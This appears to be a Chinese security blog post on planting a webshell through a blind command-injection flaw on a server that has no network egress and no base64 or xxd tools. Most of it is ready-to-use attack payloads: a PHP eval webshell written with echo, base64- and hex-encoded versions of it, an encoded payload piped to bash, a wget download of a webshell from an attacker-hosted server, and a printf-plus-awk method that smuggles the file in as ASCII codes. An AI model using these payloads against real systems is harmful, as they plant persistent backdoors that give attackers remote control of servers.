#  命令执行不出网、无回显、连基础工具base64/xxd都没有？极限生存下的命令执行，怎么打？   
 迪哥讲事   2025-05-11 14:01  
  
免责声明  
：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
1  
  
Start  
  
    前端时间碰到一个站点，本身那个框架存在一个无回显的命令执行漏洞，平时验证的时候都是让它ping一下dnslog，但是那个站点执行ping动作后，dnslog没有一点反应，but执行payload的响应跟存在漏洞的响应返回非常相似，怀疑是个不出网的设备。漏洞的细节暂不公开，咱们今天主要聊聊极限环境下如何利用这个命令执行写入webshell。  
  
  
2  
  
Action  
  
    在搞之前咱们先回顾一下通常情况下的命令执行，我们如何写webshell呢？  
  
========================================================  
  
以下内容主要借鉴文章：  
https://developer.volcengine.com/articles/7381516634714079242  
  
========================================================  
1、echo直接写入  
```
echo '<?php eval($\_POST[1]); ?>' > 1.php
```  
  
直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽  
  
2、  
base64写入  
```
echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==" | base64 -d >2.php
```  
  
使用base64是比较通用的方法，完美去除了webshell本身的特殊字符  
  
3、  
绕过重定向符  
```
echo "ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=" | base64 -d | bash
```  
```
echo "ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=" | base64 -d | sh
```  
  
重定向符>不可用时，我们可以将1或2中的整体命令base64编码，然后解码后通过bash或sh执行，  
其他字符绕过方式，如空格对应${IFS}等  
  
4、  
远端下载webshell  
```
远端服务器放置webshell,开启http
python -m http.server

目标机器执行
wget http://xx.xx.xxx.xx:8000/xxx.php
```  
  
可出网且有wget的情况下可采用此方式  
  
5、  
hex写入  
  
hex写入与base64写入相似，在 https://www.107000.com/T-Hex/  
  
将webshell编码成hex，使用xxd命令还原  
  
或在使用前将webshell使用xxd生成hex数据  
```
echo '<?php eval($\_POST[1]); ?>' |xxd -ps
```  
  
然后命令注入执行  
```
echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps > 5.php
```  
  
========================================================  
  
    常见的命令执行写webshell的方式如上所示，显然第4项直接pass，因为不出网。第一项echo直接写入，也限制住了，正如上文所说  
webshell中使用的某些关键符号可能被转码或屏蔽。能走的法子就剩下base64和xxd方式了。崩溃的是目标服务器上这两个命令都没有，可以说是相当的纯净。  
  
  
    那就没其他法子了吗？就只能放弃了吗？除了base64编码，hex编码，还能有啥编码方式呢？而且最好还是linux系统自带的，不需要借助其他工具就能解析的编码方式？  
  
  
    终于是，让我成功想到了一个不借助其他第三方工具，  
linux系统本身就能解析的一种编码方式，那就是--ASCII码！！！  
  
  
    思路有了，下面就是实践了。具体该怎么实操呢？假如，我们需要向1.jsp里面写入<%out.print("1");%>内容，那我们便可以在本机电脑上创建一个python脚本  
```
# 要处理的字符串
text = '<%out.print("1");%>'
# 打开文件以写入
with open('ascii_values.txt', 'w') as file:
    for char in text:
        # 写入每个字符的 ASCII 值，每行一个
        file.write(f"{ord(char)}\n")
```  
    结果长这样```
60
37
111
117
116
46
112
114
105
110
116
40
34
49
34
41
59
37
62
```  
  
    上面的就是每个字符串的ASCII码值，然后将上面的内容排列成这样的格式  
```
60\n37\n111\n117\n116\n46\n112\n114\n105\n110\n116\n40\n34\n49\n34\n41\n59\n37\n62\n
```  
  
    再在命令执行的地方输入payload  
```
printf "60\n37\n111\n117\n116\n46\n112\n114\n105\n110\n116\n40\n34\n49\n34\n41\n59\n37\n62\n" > /xxxxx/1.txt
```  
  
    这时候只是将它写入到了1.txt中了，下面就是将1.txt中的ASCII码内容处理成解码后的状态，再执行命令  
```
awk '{ printf "%c", $1 }' /xxxxx/1.txt > /xxxxx/1.jsp
```  
  
    如果不懂这是啥意思，可以请教一下GPT/Deepseek  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pKCicPnn24UbMzxvewrvh9MvTjx8TUAj4PI5R1cjqyQeiaCXjuSE8I3N3kWWfQ1CwTGJ3U46oJbmicwaNeXxQDr5w/640?wx_fmt=png&from=appmsg "")  
  
    至此，就成功将  
<%out.print("1");%>不借助任何第三方的工具写入到了web目录下的1.jsp文件中了  
  
    同样的照这个方式即可写入webshell文件。  
  
  
3  
  
End  
  
    如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg "")  
  
往期回顾  
# 如何绕过签名校验  
#   
  
[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)  
  
  
[挖掘有回显ssrf的隐藏payload](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496898&idx=1&sn=b6088e20a8b4fc9fbd887b900d8c5247&scene=21#wechat_redirect)  
  
  
[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)  
  
  
[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
[‍](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
